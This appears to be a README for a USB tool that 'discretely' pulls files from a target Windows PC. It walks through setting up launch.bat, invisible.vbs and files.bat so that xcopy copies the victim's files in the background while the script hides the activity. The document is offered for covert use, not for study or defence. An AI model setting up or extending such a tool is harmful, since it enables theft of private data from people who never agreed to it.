This little program allows you to discretely obtain files from a Windows PC and automatically copies them to your USB drive.

Instructions:

Download files from Github and place them into your USB Drive.
Create a new folder named "All" (this is where your newly obtained files from your target will be located.)
Go to your Windows/system32 folder and copy the following files to your USB Drive: xcopy.exe wscript.exe
So by now you should have 7 files, and 1 empty folder on your USB drive.
Safely unplug your USB drive, and test it on your machine.
Plug it in, if it does not automatically run, click on launch.bat

The program will launch, and the files will be transferred to your USB drive in the background.  

Launch.bat = launches invisible.vbs and files.bat

invisible.vbs = minimizes the the file transfer

files.bat = uses xcopy to transfer the files/folders

"All" Folder is where your targets files will be located.
